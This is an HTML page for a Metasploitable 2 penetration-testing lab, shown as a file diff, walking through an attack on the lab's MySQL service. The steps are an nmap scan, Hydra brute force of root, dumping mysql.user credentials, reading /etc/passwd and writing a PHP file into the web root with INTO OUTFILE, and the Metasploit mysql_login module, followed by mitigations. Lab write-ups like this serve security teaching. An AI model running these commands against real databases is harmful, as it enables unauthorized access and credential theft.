@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MySQL — Unauthorized Access | Metasploitable 2 Lab</title>
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+
+<nav class="site-nav">
+  <div class="container nav-inner">
+    <a class="nav-brand" href="../index.html">
+      <div class="brand-icon">M2</div>
+      <div class="brand-text"><h1>Metasploitable 2</h1><p>Penetration Testing Lab</p></div>
+    </a>
+    <div class="nav-links">
+      <a class="nav-link" href="../index.html#overview">Overview</a>
+      <a class="nav-link" href="../index.html#scan">Nmap Scan</a>
+      <a class="nav-link" href="../index.html#modules">Modules</a>
+    </div>
+    <a class="nav-btn btn" href="../index.html#modules">All Modules</a>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="breadcrumb">
+    <a href="../index.html">Home</a><span>/</span>
+    <a href="../index.html#modules">Modules</a><span>/</span>
+    <span style="color:var(--text)">MySQL</span>
+  </div>
+</div>
+
+<div class="module-hero">
+  <div class="container">
+    <div class="module-hero-top">
+      <div class="module-title-wrap">
+        <p class="section-label">Port 3306/tcp — MySQL Database</p>
+        <h2>MySQL — Unauthorized Access &amp; Credential Dump</h2>
+        <p class="sub-title">Exploiting Weak Credentials and File Write Capabilities</p>
+        <div class="overview-pills">
+          <span class="pill">CVE: <strong>N/A (Misconfiguration)</strong></span>
+          <span class="pill">Port: <strong>3306/tcp</strong></span>
+          <span class="pill">Impact: <strong>Data Breach</strong></span>
+          <span class="pill">Tool: <strong>Metasploit</strong></span>
+        </div>
+      </div>
+      <span class="badge badge-medium" style="font-size:.85rem;padding:.4rem 1rem">Medium</span>
+    </div>
+    <div class="overview-box">
+      <div class="overview-box-grid">
+        <div><div class="ov-item-label">Service</div><div class="ov-item-value">MySQL 5.0.51a</div></div>
+        <div><div class="ov-item-label">Attack Type</div><div class="ov-item-value">Auth Bypass</div></div>
+        <div><div class="ov-item-label">MSF Module</div><div class="ov-item-value mono">auxiliary/scanner/mysql/mysql_login</div></div>
+        <div><div class="ov-item-label">Result</div><div class="ov-item-value" style="color:var(--amber)">✓ Database Access Obtained</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="content-layout">
+    <main class="content-body">
+
+      <div class="step-section" id="service-overview">
+        <div class="step-label"><div class="step-num">01</div><h3>Vulnerability Overview</h3></div>
+        <p>MySQL 5.0.51a on Metasploitable 2 allows login using weak or default credentials. Once authenticated, attackers can enumerate databases, extract user credentials, or use file write features for privilege escalation.</p>
+        <div class="callout">
+          Default or weak MySQL credentials are a common misconfiguration. Successful login allows database enumeration and potential file system access.
+        </div>
+      </div>
+
+      <div class="step-section" id="enumeration">
+        <div class="step-label"><div class="step-num">02</div><h3>Service Detection</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">nmap</span> <span class="kw">-sV -v -p 3306</span> <span class="str">&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Nmap MySQL Service Version Scan</span>
+          </div>
+          <img src="../MySQL/Nmap_MySQL_Service_Scan.png" alt="MySQL Nmap" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="brute-force">
+        <div class="step-label"><div class="step-num">03</div><h3>Credential Brute Force</h3></div>
+        <p>Use Hydra to brute force MySQL credentials:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">hydra</span> <span class="kw">-l root -P /usr/share/wordlists/rockyou.txt mysql://&lt;target-ip&gt;</span></pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">Hydra MySQL Brute Force</span>
+          </div>
+          <img src="../MySQL/MySQL_Brute_Force.png" alt="MySQL Brute Force" loading="lazy" />
+        </div>
+        <p>Common credentials: root/root, root/toor, etc.</p>
+      </div>
+
+      <div class="step-section" id="database-access">
+        <div class="step-label"><div class="step-num">04</div><h3>Database Access &amp; Enumeration</h3></div>
+        <p>Connect to MySQL and enumerate databases:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">mysql</span> <span class="kw">-h &lt;target-ip&gt; -u root -p</span>
+SHOW DATABASES;
+USE mysql;
+SELECT user,password FROM user;</pre>
+        </div>
+        <div class="screenshot-wrap">
+          <div class="screenshot-bar">
+            <div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div>
+            <span class="screenshot-caption">MySQL Database Enumeration</span>
+          </div>
+          <img src="../MySQL/MySQL_Database_Access.png" alt="MySQL Database Access" loading="lazy" />
+        </div>
+      </div>
+
+      <div class="step-section" id="file-write">
+        <div class="step-label"><div class="step-num">05</div><h3>File Write Exploitation</h3></div>
+        <p>Use LOAD_FILE and INTO OUTFILE for file operations:</p>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">sql</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block">SELECT LOAD_FILE('/etc/passwd');
+SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/phpinfo.php';</pre>
+        </div>
+      </div>
+
+      <div class="step-section" id="metasploit">
+        <div class="step-label"><div class="step-num">06</div><h3>Automated Exploitation — Metasploit</h3></div>
+        <div class="code-wrap">
+          <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn">Copy</button></div>
+          <pre class="code-block"><span class="cmd">msfconsole</span>
+<span class="kw">use</span> <span class="pth">auxiliary/scanner/mysql/mysql_login</span>
+<span class="kw">set</span> RHOSTS <span class="str">&lt;target-ip&gt;</span>
+<span class="kw">set</span> USERNAME root
+<span class="kw">set</span> PASS_FILE <span class="pth">/usr/share/wordlists/metasploit/unix_users.txt</span>
+<span class="kw">run</span></pre>
+        </div>
+      </div>
+
+      <div class="step-section" id="results">
+        <div class="step-label"><div class="step-num">07</div><h3>Results &amp; Impact</h3></div>
+        <div class="results-box">
+          <h4>Outcome</h4>
+          <ul>
+            <li>Successfully brute forced MySQL credentials</li>
+            <li>Gained root access to database</li>
+            <li>Extracted user credentials from mysql.user table</li>
+            <li>Used file write capabilities for web shell upload</li>
+            <li>Potential for further privilege escalation</li>
+          </ul>
+        </div>
+        <div class="mitigation-box">
+          <h4>Detection &amp; Mitigation (Blue Team)</h4>
+          <ul>
+            <li>Change default MySQL root password</li>
+            <li>Restrict MySQL to localhost connections</li>
+            <li>Disable FILE privilege for MySQL users</li>
+            <li>Use firewall to block port 3306 externally</li>
+            <li>Monitor MySQL logs for suspicious queries</li>
+          </ul>
+        </div>
+      </div>
+
+    </main>
+    <aside class="toc">
+      <div class="toc-title">On This Page</div>
+      <a href="#service-overview">Overview</a>
+      <a href="#enumeration">Detection</a>
+      <a href="#brute-force">Brute Force</a>
+      <a href="#database-access">Database Access</a>
+      <a href="#file-write">File Write</a>
+      <a href="#metasploit">Metasploit</a>
+      <a href="#results">Results</a>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="container footer-inner">
+    <div class="footer-left">← <a href="../index.html#modules" style="color:var(--cyan)">Back to Modules</a></div>
+    <div class="footer-links"><a href="./http.html">← HTTP</a><a href="./postgresql.html">PostgreSQL →</a></div>
+  </div>
+</footer>
+<div id="lightbox" class="lightbox-overlay"><button class="lightbox-close">✕</button><img src="" alt="" /></div>
+<script src="../assets/js/app.js"></script>
+</body>
+</html></content>
+<parameter name="filePath">c:\Users\Digits\Documents\GitHub\metasploitable2-penetration-testing-lab\pages\mysql.html
